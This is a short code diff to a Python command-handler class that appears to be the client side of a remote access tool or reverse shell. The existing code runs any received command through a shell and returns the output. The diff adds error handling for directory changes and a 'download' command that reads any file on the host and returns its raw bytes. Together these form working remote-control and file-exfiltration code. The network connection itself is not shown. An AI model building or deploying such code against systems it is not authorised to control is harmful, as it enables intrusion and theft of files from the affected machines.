@@ -34,8 +34,19 @@ class CommandHandler():
 
     def shell(self, command: str):
         if command[:3] == 'cd ':
-            os.chdir(command[3:])
-            return str.encode(os.getcwd())
+            try:
+                os.chdir(command[3:])
+                return str.encode(os.getcwd())
+            except:
+                return str.encode('Error Changing Directory')
+        if command[:9] == 'download ':
+            try:
+                file = open(command[9:], 'rb')
+                return file.read()
+            except IsADirectoryError:
+                return b'[-] Cannot Save a Directory'
+            except FileNotFoundError:
+                return b'[-] File Not Found'
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
